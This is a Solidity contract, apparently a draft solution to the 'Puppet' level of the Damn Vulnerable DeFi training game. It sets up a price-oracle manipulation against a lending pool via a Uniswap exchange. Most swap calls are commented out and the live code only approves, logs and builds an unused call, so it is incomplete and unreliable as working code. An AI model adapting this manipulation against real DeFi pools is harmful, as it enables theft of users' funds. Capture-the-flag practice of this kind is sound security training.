pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "hardhat/console.sol";

interface UniswapExchange {
    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline) external returns (uint256);

    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns (uint256);

    function ethToTokenSwapInput(uint256 minTokens, uint256 deadline) external payable returns (uint256);
}

contract PuppetAttack {

    DamnValuableToken public immutable token;
    PuppetPool public immutable pool;
    UniswapExchange public immutable uniswapExchange;
    address attacker;

    constructor(address _token, address _pool, address _uniswapExchange) payable {
        token = DamnValuableToken(_token);
        pool = PuppetPool(_pool);
        uniswapExchange = UniswapExchange(_uniswapExchange);
        attacker = msg.sender;
    }

    function attack() external {
        //start 24 ETH and 1000 DVT
        //pool 10 ETH 10 DVT
        //lending 100000 DVT
        uint256 timestamp = block.timestamp * 2;
        //        console.log(pool.calculateDepositRequired(100000 * 1e18));
        //        token.approve(address(uniswapExchange), type(uint256).max);
        //        console.log(token.balanceOf(address(this)));
        //        console.log(address(uniswapExchange).balance);
        //        console.log(token.balanceOf(address(uniswapExchange)));
        //        uniswapExchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, timestamp);

        console.log(address(uniswapExchange));
        //        console.log(string(abi.encodePacked(bytes4(keccak256(bytes("tokenToEthSwapInput(uint256,uint256,uint256)"))))));

        uint256 initialAttackerBalance = token.balanceOf(address(this));
        token.approve(address(uniswapExchange), initialAttackerBalance);
        console.log(token.allowance(address(this), address(uniswapExchange)));
        //        uniswapExchange.ethToTokenSwapInput{value : 1 * 1e18}(1,timestamp);
                abi.encodeWithSelector(0x95e3c50b, initialAttackerBalance, 1, block.timestamp + 300);
        //        uniswapExchange.tokenToEthSwapInput(initialAttackerBalance, 1, block.timestamp + 300);
//        uniswapExchange.tokenToEthSwapInput(initialAttackerBalance, 1, timestamp);
        //        uniswapExchange.tokenToEthTransferInput(initialAttackerBalance, 1, timestamp, address(this));
        //        (bool success,) = uniswapExchange.call(abi.encodeWithSignature("tokenAddress()"));
        //        (bool success, ) = uniswapExchange.call{value : 20 * 1e18}(abi.encodeWithSignature("ethToTokenSwapInput(uint256,uint)", 1, type(uint32).max));
        //        (bool success,bytes memory data) = uniswapExchange.call(abi.encodeWithSignature("tokenToEthSwapInput(uint,uint,uint)", token.balanceOf(address(this)), 1, timestamp));

        //        require(success);
        //        require(success, string(abi.encodePacked(data)));
        console.log(address(uniswapExchange).balance);
        console.log(token.balanceOf(address(uniswapExchange)));

    }
}